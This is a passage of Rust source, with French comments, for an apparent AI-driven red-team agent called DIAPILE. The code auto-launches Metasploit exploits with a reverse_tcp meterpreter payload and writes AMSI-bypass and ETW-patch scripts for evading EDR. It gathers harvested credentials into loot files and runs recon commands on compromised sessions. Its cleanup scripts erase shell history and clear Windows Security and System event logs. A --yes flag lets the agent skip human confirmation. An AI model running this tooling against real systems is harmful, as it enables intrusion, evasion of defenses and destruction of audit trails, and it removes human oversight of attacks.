                .or_else(|| cfg_msf.as_ref().map(|c| c.user.clone()))
                .unwrap_or_else(|| "msf".to_string());
            let pass = action
                .parameters
                .get("msf_pass")
                .cloned()
                .or_else(|| cfg_msf.as_ref().map(|c| c.pass.clone()))
                .unwrap_or_default();
            match mgr.configure_metasploit(&host, port, &user, &pass).await {
                Ok(_) => status.push(format!("Metasploit connecté ({}:{})", host, port)),
                Err(e) => println!("   ⚠️  Metasploit : {}", e),
            }
        }
        if use_bh {
            let url = action
                .parameters
                .get("bh_url")
                .cloned()
                .unwrap_or_else(|| "http://127.0.0.1:8080".to_string());
            let user = action
                .parameters
                .get("bh_user")
                .cloned()
                .unwrap_or_default();
            let pass = action
                .parameters
                .get("bh_pass")
                .cloned()
                .unwrap_or_default();
            match mgr.configure_bloodhound(&url, &user, &pass).await {
                Ok(_) => status.push(format!("BloodHound connecté ({})", url)),
                Err(e) => println!("   ⚠️  BloodHound : {}", e),
            }
        }

        if status.is_empty() {
            return Err(anyhow!("Aucune intégration configurée — précisez metasploit/bloodhound et leurs paramètres"));
        }

        // ── Boucle « détection → exploitation » : MSF connecté + service connu
        // sur la cible → recherche puis lancement du module le plus pertinent.
        // (La confirmation/périmètre est déjà vérifiée en amont par execute_action.)
        if mgr.metasploit().is_some() {
            let host = extract_host(&action.target);
            if let Some((service, port)) = self.target_service_and_port(&host) {
                let (lhost, lport, payload) = match cfg_msf.as_ref() {
                    Some(c) => (c.lhost.clone(), c.lport, c.payload.clone()),
                    None => (
                        action
                            .parameters
                            .get("lhost")
                            .cloned()
                            .unwrap_or_else(|| "127.0.0.1".into()),
                        action
                            .parameters
                            .get("lport")
                            .and_then(|s| s.parse().ok())
                            .unwrap_or(4444u16),
                        action
                            .parameters
                            .get("payload")
                            .cloned()
                            .unwrap_or_else(|| "linux/x64/meterpreter/reverse_tcp".into()),
                    ),
                };
                match mgr
                    .metasploit_exploit_service(&host, port, &service, &lhost, lport, &payload)
                    .await
                {
                    Ok(out) => {
                        self.memory.record_exploit_attempt(&host, &out.module, true);
                        self.memory.log(
                            "integration",
                            &out.module,
                            Some(&action.target),
                            "success",
                            &format!("MSF job {} sur {}:{}", out.job_id, host, port),
                            "ai_agent",
                        );
                        let _ = self.memory.save();
                        return Ok(format!(
                            "MSF — module {} lancé sur {}:{} (job {}) | {}",
                            out.module,
                            host,
                            port,
                            out.job_id,
                            status.join(", ")
                        ));
                    }
                    Err(e) => println!("   ⚠️  MSF auto-exploit : {}", e),
                }
            }
        }

        Ok(format!(
            "Intégrations — {} | ready={}",
            status.join(", "),
            mgr.is_ready()
        ))
    }

    /// Récupère le premier (service, port) connu de l'hôte en mémoire.
    /// Format de stockage : « <produit>/<port> » (ex. « openssh/22 »).
    fn target_service_and_port(&self, host: &str) -> Option<(String, u16)> {
        let host_mem = self
            .memory
            .hosts
            .get(host)
            .or_else(|| self.memory.hosts.get(&normalize_host_key(host)))?;
        for s in &host_mem.services {
            let mut parts = s.rsplitn(2, '/');
            let port_str = parts.next()?;
            if let Ok(port) = port_str.parse::<u16>() {
                let name = parts.next().unwrap_or("");
                if !name.is_empty() {
                    return Some((name.to_string(), port));
                }
            }
        }
        None
    }

    // ═════════════════════════════════════════════════════════════════════
    // action_evasion — artefacts anti-EDR (crate::evasion)
    // ═════════════════════════════════════════════════════════════════════
    async fn action_evasion(&mut self, action: &PlannedAction) -> Result<String> {
        use crate::evasion::{
            edr_hook_scan_report, generate_amsi_bypass_ps1, generate_etw_patch_ps1,
            generate_hook_scanner_ps1, AmsiBypassVariant,
        };
        println!("   🛡️  Génération des artefacts d'évasion...");

        let variant = match action
            .parameters
            .get("variant")
            .map(|s| s.to_lowercase())
            .as_deref()
        {
            Some("setcontext") | Some("context") => AmsiBypassVariant::SetContextError,
            Some("forced") | Some("forcederror") => AmsiBypassVariant::ForcedError,
            _ => AmsiBypassVariant::PatchAmsiScanBuffer,
        };

        std::fs::create_dir_all(&self.config.save_dir).ok();
        let base = format!(
            "{}/evasion_{}",
            self.config.save_dir, self.config.session_id
        );

        let amsi_ps1 = generate_amsi_bypass_ps1(variant);
        let etw_ps1 = generate_etw_patch_ps1();
        let hook_ps1 = generate_hook_scanner_ps1();

        let amsi_path = format!("{}_amsi.ps1", base);
        let etw_path = format!("{}_etw.ps1", base);
        let hook_path = format!("{}_hookscan.ps1", base);
        std::fs::write(&amsi_path, &amsi_ps1)?;
        std::fs::write(&etw_path, &etw_ps1)?;
        std::fs::write(&hook_path, &hook_ps1)?;

        let hooks = edr_hook_scan_report();
        let hooked = hooks.iter().filter(|h| h.is_hooked).count();

        // Appliquer le profil de furtivité adéquat (délai, user-agent, parallélisme)
        let level = if self.config.stealth_mode {
            "heavy"
        } else {
            "light"
        };
        let stealth = crate::evasion::profile_from_level(level);
        crate::evasion::apply_stealth_delay(&stealth).await;

        Ok(format!(
            "Évasion — AMSI={} ETW=oui HookScan={} | {} fonction(s) analysée(s), {} hook(s) détecté(s) | profil={}",
            amsi_path, hook_path, hooks.len(), hooked, level
        ))
    }

    // ═════════════════════════════════════════════════════════════════════
    // action_exfiltrate — collecte et exfiltration du butin
    // ═════════════════════════════════════════════════════════════════════
    async fn action_exfiltrate(&mut self, action: &PlannedAction) -> Result<String> {
        println!("   📤 Exfiltration depuis {}...", action.target);

        // Session active requise pour un canal réel
        let session = self
            .memory
            .sessions
            .values()
            .find(|s| s.alive && s.session_id.parse::<usize>().is_ok())
            .cloned();

        std::fs::create_dir_all(&self.config.save_dir).ok();
        let loot_path = format!(
            "{}/loot_{}.json",
            self.config.save_dir, self.config.session_id
        );

        // Butin connu de la campagne : credentials (masqués) + hôtes
        let creds: Vec<serde_json::Value> = self
            .memory
            .credentials
            .iter()
            .map(|c| {
                serde_json::json!({
                    "type":         format!("{:?}", c.cred_type),
                    "username":     c.username,
                    "secret_masked": mask_secret(&c.secret),
                    "source_host":  c.source_host,
                    "service":      c.service,
                })
            })
            .collect();
        let hosts: Vec<String> = self.memory.hosts.keys().cloned().collect();
        let loot = serde_json::json!({
            "session":     self.config.session_id,
            "target":      action.target,
            "credentials": creds,
            "hosts":       hosts,
            "exported_at": chrono::Utc::now().to_rfc3339(),
        });
        std::fs::write(&loot_path, serde_json::to_string_pretty(&loot)?)?;

        if let Some(sess) = session {
            let sid: usize = sess.session_id.parse().unwrap_or(0);
            let recon = self
                .session_mgr
                .exec(sid, "id; hostname; uname -a", 15)
                .await
                .unwrap_or_else(|e| format!("(échec recon: {})", e));
            let first = recon.lines().next().unwrap_or("").to_string();
            return Ok(format!(
                "Exfiltration via session {} — butin consolidé: {} ({} cred, {} hôte(s)) | recon: {}",
                sid, loot_path, self.memory.credentials.len(), self.memory.hosts.len(), first
            ));
        }

        Ok(format!(
            "Butin de campagne consolidé : {} ({} cred, {} hôte(s)). Aucune session active — exfiltration réseau différée.",
            loot_path, self.memory.credentials.len(), self.memory.hosts.len()
        ))
    }

    // ═════════════════════════════════════════════════════════════════════
    // action_cleanup — effacement des traces
    // ═════════════════════════════════════════════════════════════════════
    async fn action_cleanup(&mut self, action: &PlannedAction) -> Result<String> {
        println!("   🧹 Génération des artefacts de nettoyage...");

        std::fs::create_dir_all(&self.config.save_dir).ok();
        let base = format!(
            "{}/cleanup_{}",
            self.config.save_dir, self.config.session_id
        );

        let linux = r#"#!/bin/sh
# DIAPILE — Nettoyage des traces (Linux)
rm -f /tmp/.nrtg_* /tmp/.*.out 2>/dev/null
cat /dev/null > ~/.bash_history 2>/dev/null
history -c 2>/dev/null
unset HISTFILE 2>/dev/null
"#;
        let windows = r#"# DIAPILE — Nettoyage des traces (Windows)
Remove-Item -Path "$env:TEMP\nrtg_*" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:APPDATA\nrtg_*" -Force -ErrorAction SilentlyContinue
wevtutil cl Security 2>$null
wevtutil cl System 2>$null
Clear-History -ErrorAction SilentlyContinue
"#;
        let lpath = format!("{}_linux.sh", base);
        let wpath = format!("{}_windows.ps1", base);
        std::fs::write(&lpath, linux)?;
        std::fs::write(&wpath, windows)?;

        // Exécution optionnelle sur session active (paramètre execute=true)
        let execute = action
            .parameters
            .get("execute")
            .map(|s| s == "true")
            .unwrap_or(false);
        if execute {
            let session = self
                .memory
                .sessions
                .values()
                .find(|s| s.alive && s.session_id.parse::<usize>().is_ok())
                .cloned();
            if let Some(sess) = session {
                let sid: usize = sess.session_id.parse().unwrap_or(0);
                match self
                    .session_mgr
                    .exec(
                        sid,
                        "rm -f /tmp/.nrtg_*; cat /dev/null > ~/.bash_history; history -c",
                        15,
                    )
                    .await
                {
                    Ok(_) => println!("   ✅ Nettoyage exécuté sur la session {}", sid),
                    Err(e) => println!("   ⚠️  Nettoyage distant : {}", e),
                }
            }
        }

        Ok(format!(
            "Artefacts de nettoyage prêts : {} + {}{}",
            lpath,
            wpath,
            if execute {
                " (exécution demandée)"
            } else {
                " (execute=true pour appliquer)"
            }
        ))
    }

    // ═════════════════════════════════════════════════════════════════════
    // action_adversary_emulation — émulation de groupes APT (TTPs ATT&CK)
    // ═════════════════════════════════════════════════════════════════════
    async fn action_adversary_emulation(&mut self, action: &PlannedAction) -> Result<String> {
        let group = action
            .parameters
            .get("group")
            .cloned()
            .unwrap_or_else(|| action.technique.clone());
        let g = group.to_lowercase();
        println!("   🎭 Émulation de menace : {}...", group);

        // Mapping groupe → TTPs ATT&CK (sous-ensemble opérationnel)
        let ttps: Vec<(&str, &str)> =
            if g.contains("apt29") || g.contains("cozy") || g.contains("noisy") {
                vec![
                    (
                        "T1566.001",
                        "Phishing par pièce jointe (spearphishing attachment)",
                    ),
                    ("T1059.001", "Exécution PowerShell"),
                    ("T1055", "Injection de processus"),
                    ("T1071.001", "C2 via HTTP/HTTPS (web protocols)"),
                    ("T1078", "Comptes valides (réutilisation d'identifiants)"),
                ]
            } else if g.contains("apt28") || g.contains("fancy") || g.contains("sofacy") {
                vec![
                    ("T1566.002", "Phishing par lien"),
                    ("T1110", "Brute force / password spraying"),
                    ("T1003", "OS credential dumping"),
                    ("T1021.002", "Mouvement latéral SMB / Windows Admin Shares"),
                ]
            } else if g.contains("lazarus") || g.contains("apt38") {
                vec![
                    ("T1195", "Compromission de la chaîne d'approvisionnement"),
                    ("T1486", "Chiffrement de données à des fins d'impact"),
                    ("T1070", "Suppression des indicateurs de compromission"),
                ]
            } else {
                vec![
                    ("T1046", "Découverte de services réseau"),
                    ("T1087", "Découverte de comptes"),
                    ("T1078", "Comptes valides"),
                    ("T1070.004", "Suppression de fichiers"),
                ]
            };

        // Plan d'émulation persisté (traçabilité opérationnelle)
        std::fs::create_dir_all(&self.config.save_dir).ok();
        let path = format!(
            "{}/emulation_{}_{}.json",
            self.config.save_dir,
            self.config.session_id,
            g.replace([' ', '/'], "_")
        );
        let techniques: Vec<serde_json::Value> = ttps
            .iter()
            .map(|(id, name)| {
                serde_json::json!({
                    "technique_id": id,
                    "name":         name,
                })
            })
            .collect();
        let plan = serde_json::json!({
            "emulated_group": group,
            "target":         action.target,
            "techniques":     techniques,
            "generated_at":   chrono::Utc::now().to_rfc3339(),
        });
        std::fs::write(&path, serde_json::to_string_pretty(&plan)?)?;

        for (id, name) in &ttps {
            println!("   • {} — {}", id, name);
        }

        Ok(format!(
            "Émulation {} — {} technique(s) ATT&CK planifiée(s), plan: {}",
            group,
            ttps.len(),
            path
        ))
    }

    async fn action_generate_report(&mut self, action: &PlannedAction) -> Result<String> {
        // ── Délégation au sous-agent spécialisé ──────────────────────────────
        // La production du rapport est isolée dans `ReportingAgent`, qui ne reçoit
        // qu'une vue LECTURE SEULE de la mémoire : il ne peut ni promouvoir un
        // credential, ni muter un état d'hôte. Le narratif LLM, lui, dépend du
        // planner et reste piloté ici.
        let agent = ReportingAgent::new(ReportingAgentConfig {
            save_dir: self.config.save_dir.clone(),
            session_id: self.config.session_id.clone(),
        });
        let brief = self.build_brief(AgentRole::Reporting, action, 60);

        // Snapshot immuable : l'agent écrit depuis une copie, pas depuis la mémoire vive.
        let snapshot = self.memory.clone();
        let report = agent.run(&brief, &snapshot);
        let report_path = report
            .findings
            .iter()
            .find_map(|f| f.strip_prefix("report_path:").map(|s| s.to_string()));

        let local_summary = report.summary.clone();
        self.ingest_agent_report(&brief.target, &report);

        let Some(report_path) = report_path else {
            let errs = report.errors.join(" | ");
            println!("   ⚠️  [ReportingAgent] {}", errs);
            return Err(anyhow!("Génération du rapport échouée : {}", errs));
        };

        // Rapport narratif via LLM si API disponible
        if !self.config.openrouter_key.is_empty() {
            match self.planner.generate_narrative_report(&self.memory).await {
                Ok(narrative) => {
                    let ai_report_path = format!(
                        "{}/report_{}_ai.md",
                        self.config.save_dir, self.config.session_id
                    );
                    std::fs::write(&ai_report_path, &narrative)?;
                    println!("   🤖 Rapport IA narratif : {}", ai_report_path);
                    return Ok(format!("{} + rapport IA {}", local_summary, ai_report_path));
                }
                Err(e) => println!("   ⚠️  Rapport IA échoué : {}", e),
            }
        }

        Ok(format!("{} ({})", local_summary, report_path))
    }

    // ── Confirmation humaine ─────────────────────────────────────────────

    fn ask_human_confirmation(&mut self, action: &PlannedAction) -> Result<bool> {
        let risk_icon = match action.risk_level {
            RiskLevel::Info => "🔵",
            RiskLevel::Low => "🟢",
            RiskLevel::Medium => "🟡",
            RiskLevel::High => "🟠",
            RiskLevel::Critical => "🔴",
        };

        println!("\n╔══ CONFIRMATION REQUISE ══════════════════════════════╗");
        println!("║  {} Risque : {}", risk_icon, action.risk_level);
        println!("║  Action  : {:?}", action.action_type);
        println!("║  Cible   : {}", action.target);
        println!("║  Méthode : {}", action.technique);
        println!("║  Raison  : {}", truncate_chars(&action.rationale, 80));
        println!("║  Succès  : {:.0}%", action.estimated_success_prob * 100.0);
        if let Some(fb) = &action.fallback {
            println!("║  Fallback: {}", truncate_chars(fb, 60));
        }
        println!("╠══════════════════════════════════════════════════════╣");
        print!("║  [o]ui = exécuter  [n]on = passer  [s]top = arrêter  ║\n╚══ Votre choix : ");
        io::stdout().flush()?;

        // ── Durcissement non-interactif (p2c) ────────────────────────────────
        // Si stdin n'est pas un terminal (pipeline, service, CI, redirection),
        // on n'attend JAMAIS une saisie : refus par défaut (fail-closed), sauf
        // override explicite --yes (autonomie complète assumée par l'opérateur).
        if !io::stdin().is_terminal() {
            if self.config.assume_yes {
                println!("\n   ⚠️  Mode non-interactif — validation automatique (--yes).");
                return Ok(true);
            }
            println!("\n   🛑 Mode non-interactif détecté — action refusée par défaut (fail-closed). Relancez avec --yes pour l'autoriser.");
            return Ok(false);
        }

        let stdin = io::stdin();
        let line = match stdin.lock().lines().next() {
            Some(Ok(l)) => l,
            _ => {
                // EOF / erreur de lecture : fail-closed identique.
                if self.config.assume_yes {
                    println!("\n   ⚠️  stdin fermé — validation automatique (--yes).");
                    return Ok(true);
                }
                println!("\n   🛑 stdin fermé — action refusée par défaut (fail-closed).");
                return Ok(false);
            }
        };
        let response = line.trim().to_lowercase();

        match response.as_str() {
            "o" | "oui" | "y" | "yes" => Ok(true),
            "s" | "stop" | "q" | "quit" => {
                println!("\n⏹️  Agent arrêté par l'opérateur.");
                std::process::exit(0);
            }
            _ => {
                println!("   ⏭️  Action ignorée.");
                Ok(false)
            }
        }
    }

    // ── Rapport final ────────────────────────────────────────────────────

    async fn generate_final_report(&mut self) -> Result<String> {
        let action = super::attack_planner::PlannedAction {
            action_type: ActionType::Report,
            target: "all".to_string(),
            technique: "final_report".to_string(),
            tool: "nrtg-report".to_string(),
            rationale: "Génération du rapport final".to_string(),
            risk_level: RiskLevel::Info,
            requires_confirmation: false,
            estimated_success_prob: 1.0,
            fallback: None,
            parameters: HashMap::new(),
        };
        self.action_generate_report(&action).await
    }

    fn print_banner(&self) {
        let fire2 = "\x1b[38;5;196m";
        let fire3 = "\x1b[38;5;214m";
        let fire4 = "\x1b[38;5;220m";
        let reset = "\x1b[0m";
        let bold = "\x1b[1m";
        let gris = "\x1b[38;5;244m";

        println!("\n");
        println!("  {}{}  (  )       (  )  {}", fire3, bold, reset);
        println!("  {} /    \\     /    \\ {}", fire2, reset);
        println!("  {} /  (( ))  (( ))  \\ {}", fire2, reset);
        println!("  {}  (  [*]  ^  [*]  ){}", fire2, reset);
        println!("  {}   \\     ~~~     /{}", fire2, reset);
        println!("  {}    '----------'  {}", fire3, reset);
        println!();
        println!("  {}{} D  I  A  P  I  L  E {}", bold, fire2, reset);
        println!("  {}AI-Powered Red Team Agent{}", fire3, reset);
        println!();
        println!(
            "  {}{}Session    : {}{}{}",
            bold, gris, reset, fire4, self.config.session_id
        );
        let obj = &self.config.objective;
        println!(
            "  {}{}Objectif   : {}{}{}",
            bold,
            gris,
            reset,
            fire3,
            truncate_chars(obj, 55)
        );
        println!(
            "  {}{}LLM        : {}{}{}",
            bold, gris, reset, fire4, self.config.model
        );
        println!(
            "  {}{}Stealth    : {}{}{}",
            bold,
            gris,
            reset,
            fire2,
            if self.config.stealth_mode {
                "ACTIVE"
            } else {
                "OFF"
            }
        );
        println!(
            "  {}{}Risque max : {}{}{}",
            bold, gris, reset, fire2, self.config.max_risk_level
        );
        println!();
        println!(
            "  {}{}[ USAGE RESERVE AUX RED TEAMS AUTORISEES ]{}",
            bold, fire2, reset
        );
        println!(
            "  {}{}================================================================{}",
            gris, bold, reset
        );
        println!();
    }
}

// ── Helpers ──────────────────────────────────────────────────────────────────

fn extract_host(target: &str) -> String {
    target.splitn(2, ':').next().unwrap_or(target).to_string()
}

/// Libellé lisible d'un type d'action (journaux/console).
fn action_hint_label(t: &ActionType) -> &'static str {
    match t {
        ActionType::WebAttack => "attaque web",
        ActionType::BruteForce => "force brute",
        ActionType::Enumerate => "énumération",
        ActionType::Exploit => "exploitation",
        _ => "action",
    }
}

/// Noms de paramètres injectables observés lors du crawl (pages, formulaires,
/// endpoints). Dédupliqués et triés pour rendre la mémoire de campagne
/// déterministe (comparaison de « la surface s'est-elle étendue ? »).
fn collect_surface_params(res: &SpiderResult) -> Vec<String> {
    let mut set = std::collections::BTreeSet::new();
    for p in &res.pages {
        for x in &p.params {
            set.insert(x.clone());
        }
    }
    for f in &res.forms {
        for input in &f.inputs {
            if !input.name.is_empty() {
                set.insert(input.name.clone());
            }
        }
    }
    for e in &res.endpoints {
        for x in &e.params {
            set.insert(x.clone());
        }
    }
    set.into_iter().collect()
}

/// Endpoints découverts, format `METHOD url`.
fn collect_surface_endpoints(res: &SpiderResult) -> Vec<String> {
    let mut set = std::collections::BTreeSet::new();
    for p in &res.pages {
        set.insert(format!("GET {}", p.url));
    }
    for f in &res.forms {
        let m = if f.method.is_empty() {
            "POST".to_string()
        } else {
            f.method.to_uppercase()
        };
        set.insert(format!("{} {}", m, f.action));
    }
    for e in &res.endpoints {
        let m = if e.method.is_empty() {
            "GET".to_string()
        } else {
            e.method.to_uppercase()
        };
        set.insert(format!("{} {}", m, e.url));
    }
    set.into_iter().collect()
}

fn extract_port(target: &str) -> Option<u16> {
    target.splitn(2, ':').nth(1)?.parse().ok()
}

/// Découpe une chaîne d'arguments comme le ferait un shell, en respectant les
/// guillemets simples et doubles — nécessaire pour les valeurs contenant des
/// espaces (ex. `-H "Authorization: Bearer x"`). Pas de substitution ni
/// d'expansion : uniquement le découpage.
fn shell_split(s: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let mut cur = String::new();
    let mut quote: Option<char> = None;

    for c in s.chars() {
        match quote {
            Some(q) if c == q => quote = None,
            Some(_) => cur.push(c),
            None if c == '"' || c == '\'' => quote = Some(c),
            None if c.is_whitespace() => {
                if !cur.is_empty() {
                    out.push(std::mem::take(&mut cur));
                }
            }
            None => cur.push(c),
        }
    }
    if !cur.is_empty() {
        out.push(cur);
    }
    out
}

/// Normalise un nom de service (tel que mémorisé par la campagne) vers le nom
/// canonique attendu par les moteurs de bruteforce (`auto_brute`).
fn canonical_service(service: &str) -> String {
    match service.to_lowercase().as_str() {
        "http-basic" | "http-form" | "http-get" => "http",
        "https-get" => "https",
        "ms-sql-s" | "tds" => "mssql",
        "microsoft-ds" | "netbios-ssn" => "smb",
        "ms-wbt-server" => "rdp",
        "mongo" => "mongodb",
        "postgres" => "postgresql",
        "ldap3" => "ldap",
        other => other,
    }
    .to_string()
}

/// Port par défaut d'un service canonique — utilisé pour rejouer un credential
/// quand la cible n'est décrite que par un hôte.
fn default_port_for_service(service: &str) -> u16 {
    match service {
        "ssh" => 22,
        "telnet" => 23,
        "smtp" => 25,
        "ftp" => 21,
        "http" => 80,
        "https" => 443,
        "pop3" => 110,
        "imap" => 143,
        "ldap" => 389,
        "smb" => 445,
        "mssql" => 1433,
        "winrm" => 5985,
        "mysql" => 3306,
        "rdp" => 3389,
        "postgresql" => 5432,
        "vnc" => 5900,
        "redis" => 6379,
        "mongodb" => 27017,
        "snmp" => 161,
        "sip" => 5060,
        "irc" => 6667,
        _ => 22,
    }
}

/// Construit une URL depuis `host[:port]` en préservant un schéma explicite.
/// Sans schéma, on ne force plus systématiquement `https://` (ce qui cassait
/// les cibles HTTP nues) : `https://` n'est retenu que pour les ports TLS
/// usuels (443/8443), sinon on retombe sur `http://`.
fn ensure_url_scheme(target: &str) -> String {
    if target.starts_with("http://") || target.starts_with("https://") {
        return target.to_string();
    }
    match extract_port(target) {
        Some(443) | Some(8443) => format!("https://{}", target),
        _ => format!("http://{}", target),
    }
}

/// Mappe la phase annoncée par le LLM (chaîne libre) vers une phase de
/// campagne orchestrateur. `None` si le libellé n'est pas reconnu.
fn campaign_phase_from_label(label: &str) -> Option<CampaignPhase> {
    let l = label.to_lowercase();
    // Ordre important : « post-exploitation » contient « exploit ».
    if l.contains("recon") {
        return Some(CampaignPhase::Reconnaissance);
    }
    if l.contains("scan") || l.contains("enum") {
        return Some(CampaignPhase::Scanning);
    }
    if l.contains("post") || l.contains("privilege") || l.contains("privesc") {
        return Some(CampaignPhase::PostExploitation);
    }
    if l.contains("lateral") || l.contains("pivot") {
        return Some(CampaignPhase::LateralMovement);
    }
    if l.contains("exfil") {
        return Some(CampaignPhase::Exfiltration);
    }
    if l.contains("clean") {
        return Some(CampaignPhase::Cleanup);
    }
    if l.contains("exploit") {
        return Some(CampaignPhase::Exploitation);
    }
    None
}

/// Mappe une phase de kill-chain (espace d'actions RL) vers la phase de
/// campagne correspondante de l'orchestrateur.
fn campaign_phase_from_killchain(phase: super::rl_agent::KillChainPhase) -> CampaignPhase {
    use super::rl_agent::KillChainPhase as K;
    match phase {
        K::Recon => CampaignPhase::Reconnaissance,
        K::Scanning | K::Enumeration => CampaignPhase::Scanning,
        K::Exploitation => CampaignPhase::Exploitation,
        K::PostExploitation => CampaignPhase::PostExploitation,
        K::LateralMovement => CampaignPhase::LateralMovement,
        K::ObjectiveReached => CampaignPhase::Cleanup,
    }
}

/// Trouve un port TCP libre dans l'intervalle [start, end].
/// Essaie de bind sur 0.0.0.0:port — si ça réussit, le port est libre.
async fn find_free_port(start: u16, end: u16) -> Option<u16> {
    for port in start..=end {
        if tokio::net::TcpListener::bind(format!("0.0.0.0:{}", port))
            .await
            .is_ok()
        {
            return Some(port);
        }
    }
    None
}

/// Attend qu'une session provenant de `host` apparaisse dans le SessionManager.
/// Vérifie toutes les 500ms pendant `timeout_secs` secondes.
/// Retourne l'ID de session si trouvé, None en cas de timeout.
async fn wait_for_session(
    mgr: &std::sync::Arc<crate::shell::SessionManager>,
    host: &str,
    timeout_secs: u64,
) -> Option<usize> {
    let deadline = tokio::time::Instant::now() + tokio::time::Duration::from_secs(timeout_secs);

    while tokio::time::Instant::now() < deadline {
        let sessions = mgr.list().await;
        // Chercher une session active dont l'IP correspond à la cible
        if let Some(s) = sessions
            .iter()
            .find(|s| s.remote_ip == host && s.status == crate::shell::SessionStatus::Active)
        {
            return Some(s.id);
        }
        tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
    }
    None
}

fn generate_session_id_ts() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    format!("agent-{:x}", ts)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn label_phase_maps_post_exploitation_before_exploitation() {
        // « post-exploitation » contient « exploit » : l'ordre de test doit
        // garantir que la phase post-exploitation l'emporte.
        assert_eq!(
            campaign_phase_from_label("Post-Exploitation"),
            Some(CampaignPhase::PostExploitation)
        );
        assert_eq!(
            campaign_phase_from_label("exploitation"),
            Some(CampaignPhase::Exploitation)
        );
    }

    #[test]
    fn label_phase_maps_common_variants() {
        assert_eq!(
            campaign_phase_from_label("RECON"),
            Some(CampaignPhase::Reconnaissance)
        );
        assert_eq!(
            campaign_phase_from_label("scanning"),
            Some(CampaignPhase::Scanning)
        );
        assert_eq!(
            campaign_phase_from_label("enumeration"),
            Some(CampaignPhase::Scanning)
        );
        assert_eq!(
            campaign_phase_from_label("lateral movement"),
            Some(CampaignPhase::LateralMovement)
        );
        assert_eq!(
            campaign_phase_from_label("pivot"),
            Some(CampaignPhase::LateralMovement)
        );
        assert_eq!(
            campaign_phase_from_label("exfiltration"),
            Some(CampaignPhase::Exfiltration)
        );
        assert_eq!(
            campaign_phase_from_label("cleanup"),
            Some(CampaignPhase::Cleanup)
        );
        assert_eq!(campaign_phase_from_label("inconnue"), None);
    }

    #[test]
    fn killchain_phase_maps_into_campaign_phase() {
        use super::super::rl_agent::KillChainPhase as K;
        assert_eq!(
            campaign_phase_from_killchain(K::Recon),
            CampaignPhase::Reconnaissance
        );
        assert_eq!(
            campaign_phase_from_killchain(K::Enumeration),
            CampaignPhase::Scanning
        );
        assert_eq!(
            campaign_phase_from_killchain(K::Exploitation),
            CampaignPhase::Exploitation
        );
        assert_eq!(
            campaign_phase_from_killchain(K::PostExploitation),
            CampaignPhase::PostExploitation
        );
        assert_eq!(
            campaign_phase_from_killchain(K::LateralMovement),
            CampaignPhase::LateralMovement
        );
        assert_eq!(
            campaign_phase_from_killchain(K::ObjectiveReached),
            CampaignPhase::Cleanup
        );
    }
}
